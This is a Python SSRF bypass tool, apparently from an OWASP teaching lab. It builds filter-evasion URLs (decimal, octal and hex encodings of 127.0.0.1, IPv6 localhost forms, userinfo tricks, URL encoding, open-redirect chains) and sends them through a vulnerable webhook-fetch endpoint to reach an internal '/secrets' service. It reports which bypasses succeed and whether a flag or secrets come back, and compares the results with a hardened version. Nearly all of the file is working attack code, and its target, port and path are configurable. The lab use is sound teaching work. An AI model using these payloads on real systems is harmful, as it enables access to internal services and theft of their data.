#!/usr/bin/env python3
"""
URL Bypass 攻擊腳本 - SSRF 防禦繞過技術
========================================
此腳本展示各種繞過 SSRF URL 驗證的技術。

OWASP A10:2021 - Server-Side Request Forgery (SSRF)
CWE-918: Server-Side Request Forgery

攻擊原理：
---------
當應用程式使用黑名單或簡單的正則表達式驗證 URL 時，
攻擊者可以使用各種編碼和混淆技術繞過這些防禦。

常見繞過技術：
1. IP 位址編碼（Decimal, Octal, Hex）
2. IPv6 表示法
3. DNS 大小寫混淆
4. URL userinfo 混淆
5. 開放重定向鏈

作者：OWASP Demo
"""

import requests
import json
import argparse
import socket
import struct
from typing import Tuple, Optional

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# ============================================================
# IP 位址轉換工具
# ============================================================

def ip_to_decimal(ip: str) -> int:
    """將 IP 轉換為十進位數字
    例如：127.0.0.1 -> 2130706433
    """
    parts = ip.split('.')
    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])


def ip_to_octal(ip: str) -> str:
    """將 IP 轉換為八進位格式
    例如：127.0.0.1 -> 0177.0.0.01
    """
    parts = ip.split('.')
    return '.'.join(f'0{oct(int(p))[2:]}' for p in parts)


def ip_to_hex(ip: str) -> str:
    """將 IP 轉換為十六進位格式
    例如：127.0.0.1 -> 0x7f.0x0.0x0.0x1
    """
    parts = ip.split('.')
    return '.'.join(f'0x{int(p):x}' for p in parts)


def ip_to_hex_full(ip: str) -> str:
    """將 IP 轉換為完整十六進位格式
    例如：127.0.0.1 -> 0x7f000001
    """
    decimal = ip_to_decimal(ip)
    return f'0x{decimal:08x}'


# ============================================================
# URL Bypass Payloads
# ============================================================

def generate_bypass_payloads(target_host: str, target_port: int = 8080, path: str = "/secrets") -> list:
    """
    產生各種 URL Bypass payloads
    """
    payloads = []
    
    # 1. 原始 URL（基準測試）
    payloads.append({
        "name": "原始 URL",
        "url": f"http://{target_host}:{target_port}{path}",
        "technique": "baseline",
        "description": "正常請求，作為對照基準"
    })
    
    # 2. DNS 大小寫混淆
    payloads.append({
        "name": "DNS 大小寫混淆",
        "url": f"http://{target_host.upper()}:{target_port}{path}",
        "technique": "case_confusion",
        "description": "DNS 不區分大小寫，可能繞過字串比對的黑名單"
    })
    
    payloads.append({
        "name": "DNS 混合大小寫",
        "url": f"http://{''.join(c.upper() if i % 2 else c for i, c in enumerate(target_host))}:{target_port}{path}",
        "technique": "case_confusion",
        "description": "混合大小寫增加繞過機率"
    })
    
    # 3. localhost 變體（如果目標是 localhost）
    if target_host.lower() in ['localhost', '127.0.0.1']:
        ip = '127.0.0.1'
        
        # Decimal IP
        decimal_ip = ip_to_decimal(ip)
        payloads.append({
            "name": "Decimal IP",
            "url": f"http://{decimal_ip}:{target_port}{path}",
            "technique": "ip_encoding",
            "description": f"127.0.0.1 = {decimal_ip}（十進位）"
        })
        
        # Octal IP
        octal_ip = ip_to_octal(ip)
        payloads.append({
            "name": "Octal IP",
            "url": f"http://{octal_ip}:{target_port}{path}",
            "technique": "ip_encoding",
            "description": f"127.0.0.1 = {octal_ip}（八進位）"
        })
        
        # Hex IP
        hex_ip = ip_to_hex_full(ip)
        payloads.append({
            "name": "Hex IP (full)",
            "url": f"http://{hex_ip}:{target_port}{path}",
            "technique": "ip_encoding",
            "description": f"127.0.0.1 = {hex_ip}（十六進位）"
        })
        
        # IPv6 localhost
        payloads.append({
            "name": "IPv6 localhost",
            "url": f"http://[::1]:{target_port}{path}",
            "technique": "ipv6",
            "description": "::1 是 localhost 的 IPv6 表示"
        })
        
        # IPv6 mapped IPv4
        payloads.append({
            "name": "IPv6 mapped IPv4",
            "url": f"http://[::ffff:127.0.0.1]:{target_port}{path}",
            "technique": "ipv6",
            "description": "IPv6 映射的 IPv4 位址"
        })
        
        # 0.0.0.0
        payloads.append({
            "name": "0.0.0.0",
            "url": f"http://0.0.0.0:{target_port}{path}",
            "technique": "ip_variant",
            "description": "0.0.0.0 在某些系統上等同 localhost"
        })
        
        # 短格式
        payloads.append({
            "name": "短格式 127.1",
            "url": f"http://127.1:{target_port}{path}",
            "technique": "ip_variant",
            "description": "127.1 = 127.0.0.1（省略零）"
        })
    
    # 4. URL userinfo 混淆
    payloads.append({
        "name": "URL userinfo 混淆",
        "url": f"http://allowed-domain.com@{target_host}:{target_port}{path}",
        "technique": "userinfo",
        "description": "URL 格式：scheme://userinfo@host:port/path"
    })
    
    # 5. URL 編碼
    encoded_host = ''.join(f'%{ord(c):02x}' for c in target_host)
    payloads.append({
        "name": "URL 編碼主機名",
        "url": f"http://{encoded_host}:{target_port}{path}",
        "technique": "encoding",
        "description": "對主機名進行 URL 編碼"
    })
    
    # 6. 雙斜線混淆
    payloads.append({
        "name": "雙斜線混淆",
        "url": f"http://{target_host}:{target_port}//{path}",
        "technique": "path_confusion",
        "description": "使用雙斜線可能混淆路徑解析"
    })
    
    # 7. 開放重定向（需要 internal-api 支援 /redirect）
    if target_host == "internal-api":
        payloads.append({
            "name": "開放重定向鏈",
            "url": f"http://internal-api:8080/redirect?url=http://internal-api:8080{path}",
            "technique": "redirect",
            "description": "利用開放重定向繞過白名單"
        })
    
    return payloads


# ============================================================
# 測試函數
# ============================================================

def test_payload(payload_url: str, base_url: str = VULNERABLE_URL) -> Tuple[bool, str, Optional[dict]]:
    """
    測試單個 payload
    回傳：(成功與否, HTTP 狀態, 回應內容)
    """
    try:
        response = requests.get(
            f"{base_url}/api/webhook/fetch",
            params={"url": payload_url},
            timeout=10,
            allow_redirects=True
        )
        
        if response.status_code == 200:
            try:
                data = response.json()
                content = data.get("content", response.text)
                try:
                    parsed = json.loads(content)
                    return True, f"HTTP {response.status_code}", parsed
                except:
                    return True, f"HTTP {response.status_code}", {"raw": content[:200]}
            except:
                return True, f"HTTP {response.status_code}", {"raw": response.text[:200]}
        else:
            return False, f"HTTP {response.status_code}", None
    except requests.exceptions.Timeout:
        return False, "Timeout", None
    except Exception as e:
        return False, str(e)[:50], None


def run_bypass_tests(target_host: str = "internal-api", target_port: int = 8080, 
                     path: str = "/secrets", base_url: str = VULNERABLE_URL):
    """
    執行所有 bypass 測試
    """
    print("\n" + "=" * 70)
    print("🔓 URL Bypass 攻擊測試")
    print("=" * 70)
    print(f"📍 目標：{target_host}:{target_port}{path}")
    print(f"📍 透過：{base_url}")
    
    payloads = generate_bypass_payloads(target_host, target_port, path)
    
    results = {
        "success": [],
        "failed": [],
        "blocked": []
    }
    
    for payload in payloads:
        print(f"\n{'─' * 60}")
        print(f"🧪 測試：{payload['name']}")
        print(f"   技術：{payload['technique']}")
        print(f"   URL：{payload['url'][:80]}{'...' if len(payload['url']) > 80 else ''}")
        print(f"   說明：{payload['description']}")
        
        success, status, data = test_payload(payload['url'], base_url)
        
        if success:
            print(f"   ✅ 成功！{status}")
            
            # 檢查是否獲得敏感資料
            if data:
                if "flag" in str(data).lower():
                    print(f"   🚩 發現 FLAG！")
                    results["success"].append(payload)
                elif "secrets" in str(data).lower():
                    print(f"   🔑 發現 Secrets！")
                    results["success"].append(payload)
                else:
                    print(f"   📄 獲得回應（可能不含敏感資料）")
                    results["success"].append(payload)
        else:
            if "403" in status or "401" in status or "blocked" in status.lower():
                print(f"   🛡️ 被阻擋：{status}")
                results["blocked"].append(payload)
            else:
                print(f"   ❌ 失敗：{status}")
                results["failed"].append(payload)
    
    # 總結
    print("\n" + "=" * 70)
    print("📊 測試總結")
    print("=" * 70)
    print(f"   ✅ 成功繞過：{len(results['success'])} 個")
    print(f"   🛡️ 被阻擋：{len(results['blocked'])} 個")
    print(f"   ❌ 失敗（網路/其他）：{len(results['failed'])} 個")
    
    if results["success"]:
        print("\n🎯 成功的 Bypass 技術：")
        for p in results["success"]:
            print(f"   • {p['name']} ({p['technique']})")
    
    return results


def run_localhost_bypass_demo():
    """
    專門測試 localhost bypass 技術
    展示各種繞過 127.0.0.1 黑名單的方法
    """
    print("\n" + "=" * 70)
    print("🔓 Localhost Bypass 技術展示")
    print("=" * 70)
    print("📍 目標：繞過 127.0.0.1 / localhost 黑名單")
    print("\n以下是各種表示 127.0.0.1 的方式：\n")
    
    ip = "127.0.0.1"
    
    variants = [
        ("原始 IP", ip),
        ("localhost", "localhost"),
        ("Decimal", str(ip_to_decimal(ip))),
        ("Octal", ip_to_octal(ip)),
        ("Hex (dotted)", ip_to_hex(ip)),
        ("Hex (full)", ip_to_hex_full(ip)),
        ("IPv6", "[::1]"),
        ("IPv6 mapped", "[::ffff:127.0.0.1]"),
        ("IPv6 expanded", "[0:0:0:0:0:0:0:1]"),
        ("短格式 127.1", "127.1"),
        ("0.0.0.0", "0.0.0.0"),
        ("0", "0"),
    ]
    
    print(f"{'表示法':<20} {'值':<40}")
    print("-" * 60)
    for name, value in variants:
        print(f"{name:<20} {value:<40}")
    
    print("\n💡 這些表示法在不同系統/語言中的支援程度不同")
    print("   Java URL 類別：支援 Decimal, 部分支援 IPv6")
    print("   Python urllib：支援大部分格式")
    print("   curl：支援幾乎所有格式")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本對 bypass 技術的防禦
    """
    print("\n" + "=" * 70)
    print("📊 Bypass 技術：漏洞版本 vs 安全版本")
    print("=" * 70)
    
    # 測試幾個關鍵的 bypass payloads
    test_payloads = [
        ("原始請求", "http://internal-api:8080/secrets"),
        ("大小寫混淆", "http://INTERNAL-API:8080/secrets"),
        ("IPv6 localhost", "http://[::1]:8080/"),
    ]
    
    print(f"\n{'Payload':<20} {'漏洞版本':<15} {'安全版本':<15}")
    print("-" * 50)
    
    for name, url in test_payloads:
        # 漏洞版本
        v_success, v_status, _ = test_payload(url, VULNERABLE_URL)
        v_result = "✅ 成功" if v_success else f"❌ {v_status[:8]}"
        
        # 安全版本
        s_success, s_status, _ = test_payload(url, SECURE_URL)
        s_result = "✅ 成功" if s_success else f"🛡️ 阻擋"
        
        print(f"{name:<20} {v_result:<15} {s_result:<15}")
    
    print("\n📋 安全版本的防禦措施：")
    print("   1. URL 白名單（只允許特定域名）")
    print("   2. 解析後的 IP 驗證（不只是字串比對）")
    print("   3. 阻擋私有 IP 範圍")
    print("   4. 禁止 localhost 所有變體")
    print("   5. 協議限制（只允許 HTTP/HTTPS）")


def main():
    parser = argparse.ArgumentParser(
        description="URL Bypass 攻擊工具 - SSRF 防禦繞過測試",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python url_bypass.py --test                  # 測試所有 bypass 技術
  python url_bypass.py --localhost             # 展示 localhost bypass 技術
  python url_bypass.py --compare               # 比較漏洞/安全版本
  python url_bypass.py --target postgres --port 5432  # 測試其他內部服務
  python url_bypass.py --payload "http://[::1]:8080/"  # 測試特定 payload

SSRF Bypass 技術分類：
  1. IP 編碼：Decimal, Octal, Hex
  2. IPv6：::1, ::ffff:127.0.0.1
  3. DNS 混淆：大小寫變換
  4. URL 混淆：userinfo, 雙斜線, 編碼
  5. 重定向鏈：開放重定向繞過
        """
    )
    
    parser.add_argument("--test", action="store_true", help="執行所有 bypass 測試")
    parser.add_argument("--localhost", action="store_true", help="展示 localhost bypass 技術")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--target", type=str, default="internal-api", help="目標主機")
    parser.add_argument("--port", type=int, default=8080, help="目標端口")
    parser.add_argument("--path", type=str, default="/secrets", help="目標路徑")
    parser.add_argument("--payload", type=str, help="測試特定 payload URL")
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("🔓 URL Bypass 攻擊工具 - SSRF 防禦繞過")
    print("=" * 70)
    print("⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    
    if args.payload:
        print(f"\n📋 測試 Payload：{args.payload}")
        success, status, data = test_payload(args.payload, VULNERABLE_URL)
        if success:
            print(f"✅ 成功！{status}")
            if data:
                print(json.dumps(data, indent=2, ensure_ascii=False)[:500])
        else:
            print(f"❌ 失敗：{status}")
    elif args.localhost:
        run_localhost_bypass_demo()
    elif args.compare:
        compare_vulnerability()
    elif args.test:
        run_bypass_tests(args.target, args.port, args.path, VULNERABLE_URL)
    else:
        parser.print_help()
        print("\n💡 快速開始：python url_bypass.py --test")


if __name__ == "__main__":
    main()
